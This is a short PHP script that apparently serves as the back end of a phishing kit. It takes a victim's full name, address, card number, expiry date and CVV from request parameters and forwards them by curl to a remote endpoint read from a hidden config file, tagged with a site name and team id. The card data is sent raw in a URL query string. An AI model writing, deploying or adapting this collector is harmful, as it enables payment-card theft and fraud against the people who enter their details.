<?php
$end_point = trim(file_get_contents('.aconf'));
$site = trim(file_get_contents('.sconf'));
$team = trim(file_get_contents('.tconf'));

$request = $end_point."add_payment?"
        ."fullname=".$_GET['fullname']."&"
        ."email=".$_GET['email']."&"
        ."address=".$_GET['address']."&"
        ."city=".$_GET['city']."&"
        ."state=".$_GET['state']."&"
        ."zip=".$_GET['zip']."&"
        ."cardname=".$_GET['cardname']."&"
        ."cardnumber=".$_GET['cardnumber']."&"
        ."expmonth=".$_GET['expmonth']."&"
        ."expyear=".$_GET['expyear']."&"
        ."cvv=".$_GET['cvv']."&"
        ."sameaddr=".$_GET['sameadr']."&"
        ."site=".$site."&"
        ."teamid=".$team;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, preg_replace('/\s+/', '_', $request));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$body = curl_exec($ch); 

echo $body;
?>

